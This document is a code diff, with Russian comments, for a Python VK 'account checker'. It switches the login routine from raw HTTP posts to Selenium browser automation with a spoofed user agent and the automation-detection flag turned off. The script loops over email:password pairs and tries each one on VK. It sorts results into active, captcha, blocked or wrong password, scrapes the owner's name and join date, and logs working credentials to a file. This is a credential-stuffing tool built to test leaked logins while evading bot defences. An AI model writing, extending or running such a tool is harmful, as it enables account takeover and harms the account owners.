@@ -54,39 +54,64 @@ import re
 from bs4 import BeautifulSoup
 
 def check_vk_account(email, password):
-    session = requests.Session()
-    login_url = "https://vk.com"
+    chrome_options = Options()
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"
+    chrome_options.add_argument(f"user-agent={user_agent}")
+    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    # chrome_options.add_argument("--headless")  # можно включить если не нужно видеть браузер
+
+    driver = webdriver.Chrome(options=chrome_options)
+
     try:
-        # Попробуем авторизоваться (через обычный POST запрос)
-        auth_data = {
-            "act": "login",
-            "role": "al_frame",
-            "email": email,
-            "pass": password
-        }
-        response = session.post("https://login.vk.com/?act=login", data=auth_data, allow_redirects=True)
-        if "remixsid" not in session.cookies.get_dict():
-            return None  # не авторизовались
+        auth_url = build_auth_url()
+        driver.get(auth_url)
+        time.sleep(2)
 
-        # Перейдем в профиль
-        profile = session.get("https://vk.com/settings").text
-        soup = BeautifulSoup(profile, "html.parser")
+        # Ввод логина и пароля
+        driver.find_element(By.NAME, "email").send_keys(email)
+        driver.find_element(By.NAME, "pass").send_keys(password)
+        driver.find_element(By.XPATH, "//button[@type='submit']").click()
+        time.sleep(3)
 
-        # Поиск имени и фамилии
-        full_name = soup.find("div", class_="SettingsUserBlock__name")
-        if not full_name:
-            full_name = soup.find("h2")  # запасной вариант
-        name = full_name.get_text(strip=True) if full_name else "Неизвестно"
+        # Проверка на капчу
+        if "captcha" in driver.page_source.lower():
+            print(f"[!] Капча при входе: {email}")
+            return "Капча", None, None
 
-        # Поиск даты регистрации (часто внизу страницы)
-        join_match = re.search(r"на сайте с (\d{1,2} \w+ \d{4})", profile)
-        joined = join_match.group(1) if join_match else "Неизвестно"
+        # Проверка блокировки
+        if "act=blocked" in driver.current_url or "профиль заблокирован" in driver.page_source.lower():
+            return "Блокировка", None, None
 
-        return name, joined
+        # Проверка неудачного логина
+        if "login" in driver.current_url and "password" in driver.page_source.lower():
+            return "Неверный логин/пароль", None, None
+
+        # Авторизация успешна — переходим в настройки профиля
+        driver.get("https://vk.com/settings")
+        time.sleep(2)
+
+        try:
+            name = driver.find_element(By.CSS_SELECTOR, "div.SettingsUserBlock__name").text
+        except:
+            try:
+                name = driver.find_element(By.CSS_SELECTOR, "h2").text
+            except:
+                name = "Неизвестно"
+
+        joined = re.search(r"на сайте с (\d{1,2} \w+ \d{4})", driver.page_source)
+        joined = joined.group(1) if joined else "Неизвестно"
+
+        return "Активен", name, joined
 
     except Exception as e:
-        print(f"[!] Ошибка при проверке: {e}")
-        return None
+        print(f"[!] Ошибка при проверке {email}: {e}")
+        return "Ошибка", None, None
+
+    finally:
+        driver.quit()
+
 
 def choose_output_format():
     print(L["select_format"])
@@ -272,13 +297,17 @@ def process_accounts():
                 result = check_vk_account(email, password)
                 with open("accounts_checked.txt", "a", encoding="utf-8") as checked_file:
                     if result:
-                        name, joined = result
-                        checked_file.write(f"{email}:{password}:{name}:{joined}\n")
-                        print(f"✅ {email} → {name}, зарегистрирован: {joined}")
+                        status, name, joined = result
+                        if status == "Активен":
+                            checked_file.write(f"{email}:{password}:{name}:{joined}\n")
+                            print(f"✅ {email} → {name}, зарегистрирован: {joined}")
+                        else:
+                            checked_file.write(f"{email}:{password}:{status}\n")
+                            print(f"❌ {email} — {status}")
                     else:
                         checked_file.write(f"{email}:{password}:FAILED\n")
                         print(f"❌ {email} — не удалось авторизоваться")
-                time.sleep(1)
+
 
 
 
